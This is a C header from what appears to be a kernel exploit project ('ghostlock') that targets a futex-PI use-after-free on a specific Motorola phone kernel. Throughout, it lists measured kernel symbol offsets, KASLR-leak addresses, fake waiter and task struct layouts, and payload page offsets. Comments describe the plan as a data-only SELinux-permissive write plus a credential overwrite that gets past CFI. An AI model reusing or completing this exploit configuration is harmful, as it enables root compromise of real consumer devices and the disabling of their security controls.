#ifndef TARGET_H
#define TARGET_H

/* moto g play 2026 (nevada XT2615V), MT6835 / Dimensity 6100+
 *
 *   kernel 5.15.180-android13-8-g9b2308ac0ad6-ab14563692 (4K pages, clang 14.0.7)
 *   phone build W1WNS36.18-111-3, RETUS W1WNS36.18-114-1
 *
 * Build with:  make TARGET=nevada
 *
 * Symbol offsets were mapped LIVE from the rooted lab unit
 * (kptr_restrict echoed to 0, /proc/kallsyms read as root) and cross-checked
 * against the stock boot.img analysis. See NOTES.md + device_offsets.h.
 *
 * Vulnerability status (CVE-2026-43499, futex-PI remove_waiter UAF):
 *   LIKELY VULNERABLE. (1) The k515 5.15.180 tree carries the unfixed shape:
 *   remove_waiter() locks current->pi_lock and clears current->pi_blocked_on
 *   instead of waiter->task. (2) Timeline: this kernel was built 2025-11-30,
 *   the upstream fix landed 2026-05 — a backport is chronologically
 *   impossible. Binary-level confirmation (disasm of remove_waiter) is still
 *   TODO. The exploit self-detects at runtime (kernelsnitch collisions +
 *   pselect success), so a wrong verdict costs a reboot, not a brick.
 *
 * CFI is ON (.cfi_jt variants present for ashmem/call_usermodehelper fns).
 * The reference exploit path is data-only (SELinux permissive write + cred
 * overwrite), no function-pointer hijack, so CFI does not block it.
 *
 * !!! 5.15 PORT STATUS: symbol offsets MEASURED live; struct offsets
 * !!! MEASURED via offprinter.ko (GKI android13-5.15 tree + device config,
 * !!! measured-offsets.txt). Remaining open before live fire: pselect stack
 * !!! overlay (UNMEASURED on 5.15), KIMAGE_TEXT_BASE (assumed standard),
 * !!! binary remove_waiter disasm (timeline+source say vulnerable).
 */

#define BUILD_VARIANT_LABEL "ghostlock_nevada"
#define BUILD_FINGERPRINT "motorola/nevada"
/* Struct-layout identity; must match the .layout of the offsets.h entry. */
#define TARGET_LAYOUT_ID "nevada-5.15"

/* --------------------------------------------------------------- memory ---
 * VA_BITS=39 — live _text = 0xffffffd466c00000.
 * KIMAGE_TEXT_BASE is UNCONFIRMED (kptr_restrict=2 hides the link base from
 * the static image without a full kallsyms-table parse; 0xffffffc008000000
 * is the standard GKI 5.15 link base). The physmap path the exploit uses
 * does not depend on it.
 */
#define KIMAGE_TEXT_BASE 0xffffffc008000000ULL
#define P0_PAGE_OFFSET 0xffffff8000000000ULL

/* DRAM base. Kernel code starts at phys 0x40010000 (_stext); _stext-_text is
 * 0x10000, so _text sits at phys 0x40000000: load == base, delta 0. */
#define P0_PHYS_OFFSET 0x40000000ULL

#ifndef P0_KERNEL_PHYS_LOAD
#define P0_KERNEL_PHYS_LOAD 0x40000000ULL
#endif

/* MT6835 DRAM is NOT contiguous (modem/shared holes: 0x8C/0x8E/0xD0 carveouts
 * per ccci/iomem). Bounds below are conservative; the linear map for
 * VA_BITS=39 runs to 0xffffffc000000000. Widening only costs scan time. */
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END   0xffffff8c00000000ULL
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#define DIRECT_MAP_END 0xffffff9000000000ULL
#define VMEMMAP_START 0xfffffffe00000000ULL

/* MM_STRUCT_SZ: MEASURED. sizeof(mm_struct) = 0x3e0 + cpumask 8
 * (NR_CPUS=32, no offstack, no mm_cid on 5.15) = 0x3e8, cacheline-rounded. */
#define MM_STRUCT_SZ 0x400
#define MM_ORDER 3

/* futex_init(): roundup_pow_of_two(256 * num_possible_cpus()).
 * MT6835 = 8 CPUs -> 2048 INFERRED (dmesg futex line unreadable on stock).
 * KernelSnitch self-calibrates collisions at runtime regardless. */
#define FUTEX_HASHSIZE 2048

/* No MTE hardware on MT6835 (ARMv8.2): heap pointers untagged, always. */
#define KS_MTE_TAGGED 0

/* Collision threshold: SoC memory-system property. Carryover value, wide
 * margin on the reference port; re-sweep with GHOSTLOCK_KS_THRESHOLD if a
 * nevada run shows accepted times near the threshold. */
#define KERNELSNITCH_THRESHOLD_MULT 10

/* ------------------------------------------- global symbols (kallsyms) ---
 * MEASURED LIVE 2026-09-10 (offsets from _text). */
#define INIT_TASK_OFF          0x02c43640ULL
#define INIT_CRED_OFF          0x02bfd698ULL
#define INIT_UTS_NS_OFF        0x02cc0180ULL
#define EMPTY_ZERO_PAGE_OFF    0x02d54000ULL
#define ROOT_TASK_GROUP_OFF    0x02d58ac0ULL
/* 5.15 has no selinux_enforcing symbol: use selinux_state (enforcing @ +0). */
#define SELINUX_ENFORCING_OFF  0x02daad78ULL
#define KPTR_RESTRICT_OFF      0x02afdb24ULL
/* no security_hook_active_capable_* symbol on this 5.15 build */
#define CAP_CAPABLE_ACTIVE_OFF 0ULL
#define KPTR_RESTRICT          (KIMAGE_TEXT_BASE + KPTR_RESTRICT_OFF)
#define SELINUX_BLOB_SIZES_OFF 0x021656e8ULL
#define SECURITY_HOOK_HEADS_OFF 0x02163260ULL
#define KMALLOC_CACHES_OFF     0x021664e0ULL
#define ANON_PIPE_BUF_OPS_OFF  0x01f86bb0ULL
#define CONFIGFS_READ_ITER_OFF      0x00677624ULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x00678148ULL
#define COPY_SPLICE_READ_OFF   0ULL /* absent from this build's kallsyms */
#define NOOP_LLSEEK_OFF        0x00552590ULL
/* C ashmem (drivers/staging/android/ashmem.c).
 * ASHMEM_MISC_FOPS = &ashmem_misc.fops == ashmem_misc + 0x10. */
#define ASHMEM_MISC_FOPS_OFF   0x02c91d40ULL
#define ASHMEM_FOPS_OFF        0x02104248ULL
#define ASHMEM_IOCTL_OFF       0x0113f330ULL
#define ASHMEM_COMPAT_IOCTL_OFF 0x0113f9e0ULL
#define ASHMEM_MMAP_OFF        0x0113fa40ULL
#define ASHMEM_OPEN_OFF        0x0113fd30ULL
#define ASHMEM_RELEASE_OFF     0x0113fdd0ULL
#define ASHMEM_SHOW_FDINFO_OFF 0x0113fef4ULL

/* KASLR leak */
#define SLIDE_NFULNL_LOGGER_OFF       0x02b01e28ULL
#define SLIDE_LOGGERS_0_1_OFF         0x02b01c78ULL
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x02dc6819ULL
#define SLIDE_SYSCTL_BOOTID_OFF       0x02dc6819ULL

/* Derived macros */
#define INIT_TASK           (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define INIT_CRED           (KIMAGE_TEXT_BASE + INIT_CRED_OFF)
#define INIT_UTS_NS         (KIMAGE_TEXT_BASE + INIT_UTS_NS_OFF)
#define EMPTY_ZERO_PAGE     (KIMAGE_TEXT_BASE + EMPTY_ZERO_PAGE_OFF)
#define ROOT_TASK_GROUP     (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_ENFORCING   (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define SELINUX_BLOB_SIZES  (KIMAGE_TEXT_BASE + SELINUX_BLOB_SIZES_OFF)
#define SECURITY_HOOK_HEADS (KIMAGE_TEXT_BASE + SECURITY_HOOK_HEADS_OFF)
#define KMALLOC_CACHES      (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS   (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
#define ASHMEM_MISC_FOPS    (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS         (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL        (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP         (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN         (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE      (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO  (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define CONFIGFS_READ_ITER      (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ    (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK         (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define SLIDE_NFULNL_LOGGER_IMAGE       (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
#define SLIDE_LOGGERS_0_1_IMAGE         (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
#define SLIDE_INIT_TASK_IMAGE           (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE     (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE       (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

/* ---------------------------------------------------- pselect overlay ------
 * UNMEASURED on 5.15. Scope statically from call-chain frames
 * (__arm64_sys_pselect6 vs __arm64_sys_futex + do_futex) or measure under
 * QEMU --mode stack before trusting. fops.c/slide.c word shifts below are
 * the 6.6 reference values, NOT nevada values. */
#define PSELECT_WAITER_WORD_SHIFT -2
#define SLIDE_PSELECT_WORD_SHIFT 0
#define SLIDE_PSELECT_NFDS 320
#define SLIDE_USE_SELECT 1

/* ------------------------------------------- struct fields (MEASURED) ----
 * Measured 2026-09-10 with offprinter.ko built against the GKI
 * android13-5.15 tree configured with the DEVICE config
 * (/proc/config.gz, 22 trivial diffs). See measured-offsets.txt.
 * 5.15-flat waiter (rb_node tree_entry/pi_tree_entry + flat prio/deadline),
 * NOT the nested 6.6 shape: fake-waiter macros below are translated so the
 * kernel reads the values where 5.15 looks for them.
 */
#define WAITER_LOCAL_OFF          0x00 /* unused by source; kept for reference */
#define WAITER_TREE_ENTRY_OFF     0x00
#define WAITER_PI_TREE_ENTRY_OFF  0x18
#define WAITER_TASK_OFF           0x30
#define WAITER_LOCK_OFF           0x38
#define WAITER_WAKE_STATE_OFF     0x40
#define WAITER_PRIO_OFF           0x44
#define WAITER_DEADLINE_OFF       0x48
#define WAITER_WW_CTX_OFF         0x50

/* Fake waiter: 5.15 has no node-embedded prio/deadline; the kernel compares
 * waiter->prio / waiter->deadline, so both tree and pi-tree slots alias
 * to the flat fields. */
#define FAKE_WAITER_TREE_PRIO_OFF         0x44
#define FAKE_WAITER_TREE_DEADLINE_OFF     0x48
#define FAKE_WAITER_PI_TREE_ENTRY_OFF     0x18
#define FAKE_WAITER_PI_TREE_PRIO_OFF      0x44
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF  0x48
#define FAKE_WAITER_TASK_OFF              0x30
#define FAKE_WAITER_LOCK_OFF              0x38
#define FAKE_WAITER_WAKE_STATE_OFF        0x40
#define FAKE_WAITER_WW_CTX_OFF            0x50

/* task_struct — sizeof = 0x1200 */
#define FAKE_TASK_USAGE_OFF          0x38
#define FAKE_TASK_PRIO_OFF           0x7c
#define FAKE_TASK_NORMAL_PRIO_OFF    0x84
#define FAKE_TASK_TASK_GROUP_OFF     0x400
#define FAKE_TASK_PI_LOCK_OFF        0x884
#define FAKE_TASK_PI_WAITERS_OFF     0x898
#define FAKE_TASK_PI_TOP_TASK_OFF    0x8a8
#define FAKE_TASK_PI_BLOCKED_ON_OFF  0x8b0

/* mm_struct.owner — measured 0x348. sizeof(mm_struct) = 0x3e0, so the
 * slab object is 0x3e0 + cpumask 8 (NR_CPUS=32, no offstack, no mm_cid
 * on 5.15) = 0x3e8, cacheline-rounded = 0x400. */
#define MM_OWNER_OFF             0x348
#define TASK_PID_OFF             0x5d8
#define TASK_TGID_OFF            0x5dc
#define TASK_REAL_PARENT_OFF     0x5e8
#define TASK_ATOMIC_FLAGS_OFF    0x598
#define TASK_REAL_CRED_OFF       0x790
#define TASK_CRED_OFF            0x798
#define TASK_COMM_OFF            0x7a8
#define TASK_TASKS_OFF           0x4d0
#define TASK_THREAD_INFO_FLAGS_OFF 0x00
#define TASK_SECCOMP_OFF         0x860

#define CRED_UID_OFF         4
#define CRED_SECUREBITS_OFF  36
#define CRED_CAPS_OFF        0x38 /* cap_effective: BTF-PROVEN. Caps are 8B
                                   * here (permitted 0x30, ambient 0x48),
                                   * not 16B. Old 0x48 value hit ambient. */
#define CRED_SECURITY_OFF    0x78
#define SELINUX_CRED_BLOB_OFF  0
#define SELINUX_CRED_OSID_OFF  0
#define SELINUX_CRED_SID_OFF   4
#define SECCOMP_MODE_OFF          0x00
#define SECCOMP_FILTER_COUNT_OFF  0x04
#define SECCOMP_FILTER_OFF        0x08
#define TIF_SECCOMP_BIT           11
#define PFA_NO_NEW_PRIVS_BIT      0

#define STRUCT_PAGE_SIZE              0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF         0x08
#define STRUCT_PAGE_TYPE_OFF          0x30

#define PIPE_BUFFER_SIZE         0x28
#define PIPE_BUFFER_SLOTS        32
#define PIPE_BUF_FLAG_CAN_MERGE  0x10
#define PIPE_INODE_INFO_STRUCT_SIZE   0xb8
#define PIPE_INODE_INFO_SIZE          0xc0
#define PIPE_INODE_INFO_SLOTS_PER_PAGE 21
#define PIPE_HEAD_OFF                 0x60
#define PIPE_TAIL_OFF                 0x64
#define PIPE_MAX_USAGE_OFF            0x68
#define PIPE_RING_SIZE_OFF            0x6c
#define PIPE_NR_ACCOUNTED_OFF         0x70
#define PIPE_READERS_OFF              0x74
#define PIPE_WRITERS_OFF              0x78
#define PIPE_FILES_OFF                0x7c
#define PIPE_TMP_PAGE_OFF             0x90
#define PIPE_BUFS_OFF                 0xa8
#define PIPE_USER_OFF                 0xb0

/* file_operations — 6.6 sizeof = 0x108 (no fop_flags). 5.15 has no
 * fop_flags either (added 6.12), so this block is the LEAST risky
 * carryover — still verify. */
#define FOPS_OWNER_OFF        0x00
#define FOPS_LLSEEK_OFF       0x08
#define FOPS_READ_OFF         0x10
#define FOPS_WRITE_OFF        0x18
#define FOPS_READ_ITER_OFF    0x20
#define FOPS_WRITE_ITER_OFF   0x28
#define FOPS_IOCTL_OFF        0x48
#define FOPS_COMPAT_IOCTL_OFF 0x50
#define FOPS_MMAP_OFF         0x58
#define FOPS_OPEN_OFF         0x68
#define FOPS_RELEASE_OFF      0x78
#define FOPS_SPLICE_READ_OFF  0xb8
#define FOPS_SHOW_FDINFO_OFF  0xd8

/* Exploit-internal payload page layout (not kernel dependent) */
#define LOCK_OFF      0x0E80
#define W0_OFF        0x1180
#define FOPS_OFF      0x0F80
#define SCRATCH_OFF   0x1200
#define RIGHT_OFF     0x1240
#define LEFT_OFF      0x1260
#define FAKE_TASK_OFF 0x1280
#define CFG_PAGE_OFF            16
#define CFG_NEEDS_READ_FILL_OFF 80
#define CFG_BIN_BUFFER_OFF      88
#define CFG_BIN_BUFFER_SIZE_OFF 96
#define CFG_CB_MAX_SIZE_OFF     100

/* Write 2 specific */
#define CRED_COPY_OFF 0x1080

#endif
